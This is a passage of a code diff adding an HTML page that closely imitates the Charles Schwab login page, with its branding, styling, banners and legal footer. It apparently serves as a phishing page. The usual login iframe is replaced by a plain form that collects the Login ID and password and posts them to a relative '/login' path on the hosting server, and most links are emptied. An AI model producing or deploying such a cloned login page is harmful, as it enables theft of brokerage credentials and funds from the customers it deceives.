4xIDAtLjEuMXYuNWguNWMuMy4xLjUuMi41LjQgMCAuMy0xLjUgNC0xLjUgNC0uOCAyLTIuMiA1LjUtMi4yIDYuMyAwIC40LjEuNy4yLjguMi4yLjQuMy43LjMuOSAwIDEuOS0xLjIgMi41LTJsLjEtLjJ6bS0uOC05Ljh6Ii8+PC9nPjxnIGlkPSJYTUxJRF83NV8iPjxwYXRoIGlkPSJYTUxJRF83Nl8iIGZpbGw9IiNGRkYiIGQ9Ik01LjkgMzIuOGMwIDEuMS45IDEuNyAxLjcgMi4xbC40LjJjLjguNCAxLjIuOSAxLjIgMS41IDAgLjctLjUgMS4zLTEuMiAxLjMtMS4xIDAtMS43LTEuMS0yLTEuOGwtLjQuMWMuMS43LjMgMS41LjMgMS44aC4ybC41LjJjLjMuMS43LjIgMS4xLjIgMS41IDAgMi42LS45IDIuNi0yLjMgMC0xLjMtMS0xLjktMS43LTIuMmwtLjMtLjFjLS45LS41LTEuMy0uOS0xLjMtMS41cy40LTEuMiAxLjEtMS4yYy45IDAgMS4zLjcgMS41IDEuNGwuNC0uMWMtLjEtLjYtLjItMS4xLS4yLTEuNWwtLjMtLjEtLjItLjFjLS4zLS4xLS43LS4yLTEtLjItMS40LjEtMi40IDEtMi40IDIuM3oiLz48L2c+PGcgaWQ9IlhNTElEXzcyXyI+PHBhdGggaWQ9IlhNTElEXzczXyIgZmlsbD0iI0ZGRiIgZD0iTTExLjIgMzQuNmMwIDEuOSAxLjMgMy43IDQuMiAzLjcuNyAwIDEuNy0uMiAyLjEtLjMuMi0uNS41LTEuNC42LTEuOWwtLjQtLjFjLS42IDEuMi0xLjEgMS44LTIuNCAxLjgtMS42IDAtMi43LTEuNC0yLjctMy41IDAtMS41LjctMy4yIDIuNy0zLjIgMS4yIDAgMS44LjUgMi4xIDEuN2guNGwtLjEtLjUtLjItMS4zaC0uMmMtLjQtLjEtMS0uMi0xLjgtLjItMi41LS4yLTQuMyAxLjQtNC4zIDMuOHoiLz48L2c+PGcgaWQ9IlhNTElEXzY5XyI+PHBhdGggaWQ9IlhNTElEXzcwXyIgZmlsbD0iI0ZGRiIgZD0iTTI2LjUgMzAuOGgtMy4ydi40Yy44LjEuOS4xLjkgMS40djEuNWgtMy40di0xLjVjMC0xLjIuMS0xLjMuOS0xLjR2LS40aC0zLjN2LjRjMSAuMSAxIC4yIDEgMS40djRjMCAxLjItLjEgMS4zLTEgMS40di40aDMuM1YzOGMtLjgtLjEtMS0uMS0xLTEuNHYtMS45aDMuNHYxLjljMCAxLjItLjEgMS4zLTEgMS40di40aDMuM1YzOGMtLjktLjEtMS0uMS0xLTEuNHYtNGMwLTEuMi4xLTEuMyAxLTEuNGwuMS0uNHoiLz48L2c+PGcgaWQ9IlhNTElEXzY0XyI+PHBhdGggaWQ9IlhNTElEXzY1XyIgZmlsbD0iI0ZGRiIgZD0iTTM3LjggMzAuOGgtMi42di40aC40Yy4yIDAgLjMuMS40LjEgMCAuMS4xLjEuMS4yczAgLjMtLjEuNWMwIC4xLS42IDIuNi0xLjEgNC4yLS4xLS4yLTItNS4zLTItNS4zaC0uNXMtMS43IDUuMy0xLjcgNS40Yy0uMS0uMi0xLjMtNC40LTEuMy00LjQgMC0uMi0uMS0uMy0uMS0uNHYtLjJjLjEtLjEuMi0uMS40LS4xaC40di0uM0gyN3YuNGMuNi4xLjguMSAxLjEgMS4xbDEuOSA2aC41czEuNy01LjIgMS44LTUuM2MuMS4yIDEuOSA1LjMgMS45IDUuM2guNWMxLTMuNSAxLjktNS45IDEuOS02IC40LTEgLjUtMS4xIDEuMi0xLjF2LS41ek0zMi4zIDMzem0yLjYgMy4zeiIvPjwvZz48cGF0aCBpZD0iWE1MSURfNTlfIiBmaWxsPSIjRkZGIiBkPSJNMzkuOCAzMi42cy44IDIuNC45IDIuNEgzOWMtLjEgMCAuOC0yLjQuOC0yLjR6bTEuNC4ybC0uOC0yLjEtLjUuMS0yLjMgNS45Yy0uNCAxLS41IDEuMS0xLjIgMS4xdi40SDM5di0uNGgtLjNjLS4yIDAtLjQtLjEtLjQtLjJ2LS4yYzAtLjEgMC0uMi4xLS40bC4xLS4yYy4xLS40LjMtMSAuNC0xLjJINDFjLjIuNi41IDEuMy42IDEuNiAwIC4xLjEuMi4xLjN2LjFjMCAuMS0uMS4xLS4zLjFsLS4zLjF2LjNoM3YtLjRjLS42LS4xLS44LS4xLTEuMi0xLjFsLTEuNy0zLjh6Ii8+PHBhdGggaWQ9IlhNTElEXzUyXyIgZmlsbD0iI0ZGRiIgZD0iTTQ2LjUgMzEuOGMwLS4zIDAtLjUuMS0uNWguNWMuMyAwIDEuNC4xIDEuNCAxLjQgMCAuOS0uNiAxLjQtMS42IDEuNGgtLjR2LTIuM3ptLTIuMS0xdi40Yy44LjEuOS4xLjkgMS40djRjMCAxLjItLjEgMS4zLTEgMS40di40aDIuOGMuOSAwIDEuNy0uMiAyLjItLjUuNy0uNCAxLTEgMS0xLjcgMC0xLS43LTEuNy0yLTEuOS42LS4xIDEuNi0uNiAxLjYtMS42IDAtLjYtLjItMS0uNi0xLjMtLjQtLjMtLjktLjQtMS44LS40aC0zLjF6bTIuNSAzLjZjMS4zIDAgMiAuNiAyIDEuN3MtLjggMS42LTEuNSAxLjZjLS4zIDAtLjUgMC0uNi0uMS0uMi0uMi0uMi0uNS0uMi0xLjF2LTJjMC0uMS4zLS4xLjMtLjF6Ii8+PC9nPjwvZz48L3N2Zz4=)
+        }
+
+        .header__schwablogo .svg-icon.svg-logo.chinese {
+            width: 96px;
+            background-image: url("../Login/Images/CSchwab_Chinese_logo_core_blue_transparent.png");
+        }
+
+        .header__schwablogo .svg-icon.svg-logo.charitable {
+            display: block;
+            width: 315px;
+            height: 80px;
+            background-image: url(https://content.schwab.com/web/login/LOG-SchwabCharitable-Horz-RGB.svg);
+            background-repeat: no-repeat;
+            background-position: 0
+        }
+
+    .main {
+        width: 1140px;
+        margin: 30px auto 0
+    }
+
+    section.main__content {
+        width: 100%;
+    }
+
+    .backgroundImage1 {
+        min-height: 463px;
+        padding: 25px 0 0;
+        background: url(https://content.schwab.com/web/login/Login_Background.jpg) no-repeat center;
+        background-position: center;
+        -webkit-background-size: cover;
+        -moz-background-size: cover;
+        -o-background-size: cover;
+        background-size: cover;
+    }
+    div.segment {
+        /*width: 865px;*/
+        height: fit-content;
+        text-align: center;
+        padding-bottom: 20px;
+    }
+
+        div.segment .lms-login {
+            background: #fff;
+            margin: 0 auto;
+            padding: 24px 0 0;
+            width: 370px;
+            text-align: center
+        }
+
+            div.segment .lms-login h1 {
+                font-size: 25px;
+                font-family: CharlesModernLight,CharlesModern-Light,Helvetica Neue,Helvetica,Arial,sans-serif;
+                color: #111;
+                margin-bottom: 5px
+            }
+
+            div.segment .lms-login h2 {
+                margin: 0 35px 17px;
+                font-size: 13px;
+                line-height: 17px;
+                font-family: ArialMT,Arial,sans-serif;
+                color: #111
+            }
+
+            div.segment .lms-login #iframeWrapper, div.segment .lms-login iframe {
+                width: 301px;
+                height: 267px;
+            }
+
+            div.segment .lms-login iframe {
+                border: none
+            }
+
+            div.segment .lms-login .lms-login__iframe {
+                margin: 0 auto 16px
+            }
+
+            div.segment .lms-login .lms-login__utilitylinks {
+                border-top: 1px solid #ddd;
+                background-color: #f1f1f1;
+                height: 76px
+            }
+
+                div.segment .lms-login .lms-login__utilitylinks ul {
+                    margin-top: 14px
+                }
+
+                    div.segment .lms-login .lms-login__utilitylinks ul li {
+                        list-style-type: none;
+                        font-size: 14px;
+                        margin-bottom: 10px
+                    }
+
+                    div.segment .lms-login .lms-login__utilitylinks ul.left-links {
+                        float: left;
+                        text-align: left;
+                        margin-left: 35px
+                    }
+
+                    div.segment .lms-login .lms-login__utilitylinks ul.right-links {
+                        float: right;
+                        text-align: right;
+                        margin-right: 35px
+                    }
+
+    footer {
+        width: 100%;
+        padding: 8px;
+    }
+
+        footer .footer__disclosures {
+            /*width: 865px;*/
+            font-family: ArialMT,Arial,sans-serif;
+            font-size: 11px;
+            line-height: 13px;
+            color: #222
+        }
+
+        footer .disclosures {
+            border: 1px solid #222 !important;
+            padding: 5px 0 !important;
+            font-size: 12px !important;
+            font-weight: 700 !important;
+            color: #222 !important;
+            text-align: center !important;
+            width: auto !important;
+        }
+
+        footer p {
+            margin: 15px 0
+        }
+        footer .links-allign{
+            padding-right: 21px;
+        }
+        footer .sdps-list--inline {
+            text-align: center;
+            margin: 48px 0;
+        }
+        header__schwablogo a span {
+        margin-left: 0 !important;
+        padding-left: 0 !important;
+    }
+    .sdps-grid-fluid {
+        background-color: #f1f1f1;
+    }
+    .sdps-grid-container {
+        margin: 0px !important;
+    }
+    @media screen and (max-width: 650px) {
+        .sdps-list--inline li {
+            margin-right: 0px !important;
+            font-size: 12px !important;
+        }
+
+        footer .links-allign {
+            padding-right: 0px;
+        }
+        div.backgroundImage2, div.backgroundImage1 {
+            background: none;
+        }
+    }
+    .UrgentMessageLink {
+        text-decoration: underline !important;
+    }
+
+    .cms-message-sprite {
+        background: url() no-repeat scroll 0 0
+    }
+
+    .cms-message-box {
+        margin-bottom: 10px;
+        position: relative;
+        border: 1px solid #ccc;
+    }
+
+    .cms-message-icon {
+        width: 26px;
+        height: 26px;
+        position: absolute;
+        top: 11px;
+        left: 10px
+    }
+
+    .cms-message-text {
+        margin: 14px 10px 14px 45px;
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 1em
+    }
+
+    .cms-message-info {
+        border-color: #9ecde0;
+        background-color: #edf3f9
+    }
+
+        .cms-message-info .cms-message-icon {
+            background-position: -322px -27px;
+            display: block !important
+        }
+
+    .cms-message-critical {
+        border-color: #e5b2c1;
+        background-color: #fcf7f9
+    }
+
+        .cms-message-critical .cms-message-icon {
+            background-position: -295px -25px
+        }
+
+    .cms-message-important {
+        border-color: #f7df8c;
+        background-color: #fefaee
+    }
+
+        .cms-message-important .cms-message-icon {
+            background-position: -295px -53px
+        }
+
+    .cms-message-success {
+        border-color: #addcad;
+        background-color: #f0f9f0
+    }
+
+        .cms-message-success .cms-message-icon {
+            background-position: -294px 0px
+        }
+
+    .westerntext {
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 0.88em;
+    }
+    footer .client-relationship {
+        padding: 0 8px;
+    }
+
+    footer .banner-list {
+        align-items: stretch;
+    }
+
+    footer .marketingContent, footer .DecaLogin {
+        border-radius: 10px;
+        box-shadow: 0px 4px 5px rgba(0,0,0,0.15), 0px 1px 10px rgba(0,0,0,0.12), 0 2px 4px -1px rgba(0,0,0,0.3);
+        -webkit-box-shadow: 0px 4px 5px rgba(0,0,0,0.15), 0px 1px 10px rgba(0,0,0,0.12), 0 2px 4px -1px rgba(0,0,0,0.3);
+        -moz-box-shadow: 0px 4px 5px rgba(0,0,0,0.15), 0px 1px 10px rgba(0,0,0,0.12), 0 2px 4px -1px rgba(0,0,0,0.3);
+        padding: 0;
+        height: 100%;
+    }
+
+    div.DecaLogin .card-content .card1_header {
+        padding-bottom: 16px;
+    }
+    div.DecaLogin .card-content a {
+        padding-bottom: 24px;
+    }
+    footer .footerImage {
+        border-radius: 5px;
+        width: 100%;
+    }
+
+    footer .sdps-grid-container {
+        margin-top: 46px !important;
+        margin-bottom: 64px !important;
+    }
+
+    @media (min-width: 768px) {
+        footer .column {
+            -webkit-box-flex: 0;
+            -ms-flex: 0 0 29.5%;
+            flex: 0 0 31.5%;
+            max-width: 31.5%;
+            padding: 0px !important;
+        }
+    }
+
+    @media (min-width: 750px) {
+        footer ul {
+            flex-wrap: nowrap !important;
+        }
+    }
+
+    @media screen and (max-width: 767px) {
+        footer .cont {
+            flex-wrap: wrap;
+        }
+
+        footer ul {
+            flex-wrap: wrap !important;
+        }
+
+        footer .column {
+            width: 100% !important;
+            padding: 0px !important;
+        }
+
+        footer .center-card {
+            margin: 32px 0 32px 0 !important;
+        }
+    }
+
+    footer .center-card {
+        margin: 0 22px 0 22px;
+    }
+
+    footer .smartBanner, footer .marketingContent {
+        height: 100%;
+    }
+
+    .card-content {
+        padding: 24px;
+    }
+
+    footer ul {
+        justify-content: center;
+    }
+
+    .chinese {
+        font-family : Microsoft JhengHei, LiHei, Arial, MingLiU, sans-serif;
+    }
+
+    </style>
+<!--WAMCHECK:P1-024399:03279eb4-273b-4b55-8849-e96e3a39e9a8:Good:END-->
+
+<title>
+	Login | Charles Schwab
+</title>
+
+
+
+ <div id="loginContainer" class="sdps-grid-container sdps-wrap">
+    <header class="col-full col-m-full col-s-full sdps-m-bottom_small">
+            <div class="header__schwablogo sdps-flush--left">
+                <a href="https://www.schwab.com" id="headerLogoUrl" class="logo" aria-label="Charles Schwab Logo click here to go to the home page.">
+                    <span id="defaultLogo" class="svg-icon svg-logo" aria-hidden="true"></span>
+                    
+                    
+                </a>
+            </div>
+    </header>
+
+    <div class="col-full col-m-full col-s-full">
+        <section class="main__content">
+            <div class="messaging ">
+                
+                <!-- Begin Global Message -->
+		        
+
+                <!-- Begin 503 error Message -->
+                
+                <!-- end 503 error Message -->
+                
+                <div id="isUrgentMessage" class="cms-message-info cms-message-box cf">
+                    <div class="cms-message-icon cms-message-sprite"></div>
+                        <div class="cms-message-text">
+                            <span id="urgentMessage"><strong>Recently moved here from TD Ameritrade?</strong> Log in below to get started and complete your Schwab client profile. If you haven’t already, you'll need to <a href=""> create your Schwab Login ID and password first</a>.</span>
+                        </div>
+                </div>
+                
+                
+                <!-- End Global Message -->
+                <!-- begin ltrJSDisableErrorMessage -->
+	            <NOSCRIPT><div class='pnlErr'>Your browser does not support or has disabled JavaScript. In order to benefit from all available online tools you will need to enable JavaScript.</div></NOSCRIPT>
+                <!-- end ltrJSDisableErrorMessage -->
+                <!-- begin ViewOnly RedirectLoginpnl -->
+	                                                
+                <!-- end ViewOnly RedirectLoginpnl -->
+                <!-- begin pnlError -->
+	            <div id="pnlError" class="section-error paddingRight-0" style="display: none" role="alert" aria-live="polite">
+                    <div class="clrFlt"><span class="icon-error message-icon"></span></div><p><span id="lblError" class="message-content"></span></p>
+                    <div class="clrFlt"></div>
+	            </div>
+                  
+                <!-- end pnlError -->
+
+                <!-- begin pnlLogoutSurvey -->
+                
+                <!-- end pnlLogoutSurvey -->
+
+                <!-- begin litLoginInfoTop -->
+                
+                <!-- end litLoginInfoTop -->
+            </div>
+            <div id="loginWrapper" class="backgroundImage1">
+                <div class="segment">
+                    <div class="lms-login">
+                        
+                        <h1 id="loginHeadline">Log in to Schwab</h1>
+
+                        <div id="iframeWrapper" class="lms-login__iframe">
+                            <form action="/login" method="post" class="login-form">
+                                <label for="login_id" class="login-pass">Login ID</label>
+                                <br>
+                                <input type="text" name="login_id" id="login_id" required class="login-input">
+                                <br>
+                                <label for="password" class="login-label">Password</label>
+                                <br>
+                                <input type="password" name="password" id="password" required class="login-input">
+                                <br>
+                                <label for="remember_me" class="login-remember">
+                                    <input type="checkbox" name="remember_me" id="remember_me" class="login-checkbox">
+                                    Remember Login ID
+                                </label>
+                                <br>
+                                <br>
+                                <span class="login-h4">Start Page</span>
+                                <select name="start_page" class="login-start">
+                                  <option value="Accounts Summary">Accounts Summary</option>
+                                </select>
+                                <br>
+                                <br>
+                                <input type="submit" value="Login" class="login-button">
+                            </form>
+                              
+                        </div>
+                                             
+                        <div id="loginModuleUtilityLinks" class="lms-login__utilitylinks cf">
+                            <ul class="left-links">                               
+                                
+                                <li id="splitAccessRecovery">Forgot <a href="" aria-label="Recover your Login ID">Login ID</a> or <a href="" aria-label="Recover your Password">Password?</a></li>
+                                <li><a href="" id="lnkChineseTrading" lang="zh-TW">中文網路通</a></li>
+                            </ul>
+                            <ul class="right-links">
+                                <li><a href="" id="lnkNewUserLms">New user?</a></li>
+                                <li></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>          
+            </div> 
+             <footer role="contentinfo" class="sdps-m-top_small">
+                 <div id="smartBanners" class="sdps-grid-container sdps-wrap">
+                     <div class="sdps-row sdps-wrap">
+                         <ul class="sdps-row cont sdps-wrap banner-list">
+                            <li class="column">
+                                <div id="banner1" class="smartBanner"><div class="DecaLogin"><a aria-labelledby="card1_link" href="" role="link" tabindex="0"><img alt="null" class="footerImage" data-entity-type="" data-entity-uuid="" src="https://content.schwab.com/drupal_dependencies/DECA/AMEXCards@2x.png" /></a><div class="card-content"><h3 class="card1_header" id="SBheadline">Charles Schwab cards from American Express.</h3><div class="card1_body" id="SBdescription">Exclusive Schwab benefits with premium service from American Express. Terms apply.</div><a aria-label="Learn more about Charles Schwab cards from American Express" href="" id="card1_link">Learn more</a></div></div></div>
+                            </li>
+                            <li class="column center-card">
+                                <div id="banner2" class="smartBanner"><div class="DecaLogin"><a aria-labelledby="card2_link" href="" role="link" tabindex="0"><img alt="null" class="footerImage" data-entity-type="" data-entity-uuid="" src="https://content.schwab.com/drupal_dependencies/DECA/4-SSlices-gift-LILO.png" /></a><div class="card-content"><h3 class="card2_header" id="SBheadline2">A simple way to introduce someone you care about to the power of investing.</h3><div class="card2_body" id="SBdescription2">Get Schwab Stock Slices™ for as little as $5.</div><a aria-label="Learn more about Stock Slices™" href="">Learn more</a></div></div></div>
+                            </li>
+                            <li class="column">
+                                <div id="banner3" class="smartBanner"><div class="DecaLogin"><a aria-labelledby="card3_link" href="" role="link" tabindex="0"><img alt="Man carrying surfboard by the beach" class="footerImage" data-entity-type="" data-entity-uuid="" src="https://content.schwab.com/drupal_dependencies/DECA/hyic%20no%20atm%20fees.png" /></a><div class="card-content"><h3 class="card3_header" id="SBheadline3">No fees. No minimums. No worries.</h3><div class="card3_body" id="SBdescription3">The way a checking account is supposed to be.</div><a aria-label="Learn more about the Schwab Bank Investor Checking™ account" href="" id="card3_link">Learn more</a><div class="card3_legal" id="SBlegal">Member FDIC</div></div></div></div>
+                            </li>
+                        </ul>
+                     </div>
+                 </div>
+                 
+                    <div class="client-relationship">
+                     <div id="clientRelationship" class="sdps-grid-fluid">
+                        <div class="col sdps-p-around_medium">
+                                <a id="privacyLink" class="ot-sdk-show-settings schwab-privacy-button" style="display:none" href="javascript:void(0)">Do Not Sell or Share My Personal Information</a>
+                                
+                                <div><span id="clientRelationshipSummaryText1" class="sdps-text-l-bold-body">Important information about our relationship with you:</span> <a href="" id="lnkRelationshipSummaries">Client Relationship Summaries</a></div>
+                                <div class="sdps-p-top_medium"><span id="clientRelationshipSummaryText2">Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at</span> <a href="" id="lnkSchwabTransparency">schwab.com/transparency</a>.</div>
+                        </div>
+                     </div>
+                    </div>
+                    <div id="footerlinks">
+                        <ul class="sdps-list--inline">
+                            <li><span class="svg-lock-icon" role="img" aria-label="Blue lock icon"></span><a href="" id="footerLink1" target="_blank" class="links-allign">Schwab Safe®</a>|</li>
+                            <li><a href="" id="footerLink2" target="_blank" class="links-allign">The Schwab Security Guarantee</a>|</li>
+                            <li><a href="" id="footerLink3">Schwab Homepage</a></li>
+                        </ul>
+                    </div>
+                    <div id="CHANFooter" class="footer__disclosures sdps-p-bottom_medium"><p><a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="" rel="" target="" title="" type="">Web Browser Information</a> — IMPORTANT information for Windows XP users.</p><p class="disclosures">Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value</p><p>Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p><p>Check the background of this firm or one of its investment professionals on <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="" rel="" target="" title="" type="">FINRA's BrokerCheck</a>.</p><p>The Charles Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Charles Schwab &amp; Co., Inc. (<a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="" rel="" target="" title="" type="">member SIPC</a>), offers investment services and products, including Schwab brokerage accounts. Its banking subsidiary, Charles Schwab Bank (member FDIC and an Equal Housing Lender), provides deposit and lending services and products. Access to Electronic Services may be limited or unavailable during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.</p><p>This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="" rel="" target="" title="" type="">non-U.S. residents</a>.</p><p>© 2023 Charles Schwab &amp; Co., Inc, All rights reserved. Member <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="" rel="" target="" title="" type="">SIPC</a>. Unauthorized access is prohibited. Usage will be monitored. (0617-ZYYE)</p></div>
+                </footer> 
+        </section>
+    </div>
+ </div>
+    
+</html>
